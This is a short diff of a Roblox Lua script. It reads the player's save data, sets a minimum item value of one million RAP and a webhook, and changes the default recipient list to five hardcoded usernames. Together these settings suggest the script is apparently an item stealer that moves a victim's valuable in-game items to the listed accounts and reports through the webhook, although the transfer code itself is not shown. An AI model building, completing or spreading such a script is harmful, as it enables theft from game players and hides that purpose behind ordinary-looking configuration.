@@ -17,7 +17,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
 local min_rap = _G.minrap or 1000000
 local webhook = _G.webhook or ""
 
